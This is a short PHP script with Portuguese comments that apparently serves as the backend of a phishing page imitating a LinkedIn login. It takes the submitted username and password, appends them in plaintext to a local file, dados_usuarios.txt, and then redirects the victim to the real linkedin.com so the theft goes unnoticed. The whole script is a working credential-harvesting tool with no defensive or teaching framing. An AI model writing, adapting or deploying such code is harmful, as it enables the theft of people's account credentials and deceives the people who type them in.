<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera os valores enviados pelo formulário
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Verifica se os campos não estão vazios
    if (empty($username) || empty($password)) {
        echo "Username e Password são obrigatórios.";
        exit;
    }

    // Caminho para o arquivo onde os dados serão armazenados
    $file_path = "dados_usuarios.txt";

    // Formato dos dados a serem escritos no arquivo
    $data = "Username: $username - Password: $password\n";

    // Tenta escrever os dados no arquivo
    try {
        if (file_put_contents($file_path, $data, FILE_APPEND | LOCK_EX) !== false) {
            // Redireciona o usuário para o Linkedin após passar as credenciais
            header("Location: https://www.linkedin.com/");
            exit;
        } else {
            throw new Exception("Falha ao escrever no arquivo.");
        }
    } catch (Exception $e) {
        echo "Ocorreu um erro ao armazenar os dados: " . $e->getMessage();
    }
} else {
    // Se não foram enviados via POST, redireciona para o formulário
    header("Location: index.html");
    exit;
}
?>
